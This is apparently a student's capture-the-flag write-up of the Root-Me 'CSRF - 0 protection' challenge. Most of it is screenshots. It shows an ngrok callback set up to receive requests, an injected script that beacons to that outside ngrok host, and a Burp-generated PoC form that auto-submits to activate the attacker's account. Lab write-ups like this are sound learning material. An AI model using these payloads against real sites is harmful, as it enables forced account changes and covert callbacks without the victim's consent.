# Lab 1 CSRF - 0 protection

- Activate your account to access intranet.

![[Pasted image 20251118111411.png]]
![[Pasted image 20251118111511.png]]

## Testing the site 
![[Pasted image 20251118111607.png]]
![[Pasted image 20251118111634.png]]
![[Pasted image 20251118111650.png]]

## Sending Simple Script to the admin
- we need to force the admin to activate our account
- First lets open python server and ngrok to get response
```
 python3 -m http.server 8000
```

```
ngrok http 8000
```

```
<script>
	  new Image().src = "https://dcd24d46d48f.ngrok-free.app/test?ok=1";
</script>
```
![[Pasted image 20251118111941.png]]
![[Pasted image 20251118111952.png]]
![[Pasted image 20251118112018.png]]
- perfect now we need to generate poc 

## CSRF POC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="test1" />
      <input type="hidden" name="status" value="on" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![[Pasted image 20251118112249.png]]

## Go To Private
![[Pasted image 20251118112346.png]]